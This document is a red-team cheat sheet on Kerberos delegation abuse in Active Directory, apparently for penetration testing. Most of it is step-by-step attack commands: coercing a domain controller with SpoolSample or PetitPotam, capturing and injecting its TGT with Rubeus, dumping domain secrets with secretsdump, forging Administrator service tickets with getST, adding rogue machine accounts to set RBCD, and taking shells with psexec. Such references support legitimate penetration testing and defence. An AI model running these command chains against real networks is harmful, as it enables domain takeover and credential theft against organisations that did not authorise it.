# Kerberos Delegation

## Overview
Delegation allows a service to act on behalf of a user to access other services. When misconfigured, it's a powerful escalation path.

---

## Unconstrained Delegation
**What:** The server can impersonate any user to any service. The user's TGT is stored in memory on the delegation host.

**Find it:**
```bash
# BloodHound: "Shortest Paths to Unconstrained Delegation Systems"
# Or LDAP query:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
# impacket:
impacket-findDelegation 'DOMAIN/USER:PASS' -dc-ip DC-IP
```

**Exploit:**
```bash
# On the unconstrained delegation host (need local admin):
Rubeus.exe monitor /interval:5 /nowrap
# Coerce DC to authenticate:
python3 SpoolSample.py DOMAIN/USER:PASS@DC-IP DELEGATION-HOST
# Or: python3 PetitPotam.py DELEGATION-HOST DC-IP
# Rubeus captures DC TGT → inject it:
Rubeus.exe ptt /ticket:BASE64_TGT
# Now you have DC access:
impacket-secretsdump 'DOMAIN/DC$'@DC-IP -k -no-pass
```

---

## Constrained Delegation
**What:** The server can impersonate users but only to specific services listed in `msDS-AllowedToDelegateTo`.

**Find it:**
```bash
impacket-findDelegation 'DOMAIN/USER:PASS' -dc-ip DC-IP
# Look for msDS-AllowedToDelegateTo attribute
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

**Exploit (with password/hash of delegation account):**
```bash
# Request ST as Administrator to the allowed service:
impacket-getST 'DOMAIN/svc_account:password' -spn cifs/TARGET.DOMAIN -impersonate Administrator -dc-ip DC-IP
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
impacket-psexec 'DOMAIN/Administrator'@TARGET.DOMAIN -k -no-pass
```

**Note:** The SPN in the ticket can be changed (service name is not encrypted in the ticket). If allowed to delegate to `HTTP/target`, you can modify the ticket to `cifs/target`.

---

## Resource-Based Constrained Delegation (RBCD)
**What:** The *target* machine defines who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`). This is configured on the target, not the source.

**Requirements:**
1. Write access to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (GenericWrite/GenericAll on the computer object)
2. A computer account you control (or ability to create one — default domain user can create up to 10)

**Exploit:**
```bash
# Step 1: Create a machine account (if you don't have one):
impacket-addcomputer 'DOMAIN/USER:PASS' -computer-name 'FAKE$' -computer-pass 'FakePass123'

# Step 2: Set RBCD on target (allow FAKE$ to delegate to TARGET$):
python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write 'DOMAIN/USER:PASS' -dc-ip DC-IP
# Or with impacket:
impacket-rbcd 'DOMAIN/USER:PASS' -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write -dc-ip DC-IP

# Step 3: Get ST as Administrator:
impacket-getST 'DOMAIN/FAKE$:FakePass123' -spn cifs/TARGET.DOMAIN -impersonate Administrator -dc-ip DC-IP

# Step 4: Use the ticket:
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
impacket-psexec 'DOMAIN/Administrator'@TARGET.DOMAIN -k -no-pass
```

---

## Quick Reference

| Type | Configured On | Who Decides | Scope |
|------|--------------|-------------|-------|
| Unconstrained | Source (computer) | Source admin | Any service, any target |
| Constrained | Source (user/computer) | Source admin | Specific SPNs only |
| RBCD | Target (computer) | Target admin (or GenericWrite) | Specific sources only |

## Key Tools
- `impacket-findDelegation` — enumerate delegation
- `impacket-getST` — request service tickets via S4U
- `impacket-addcomputer` — create machine accounts
- `Rubeus.exe` — monitor/inject tickets on Windows
- `rbcd.py` — configure RBCD
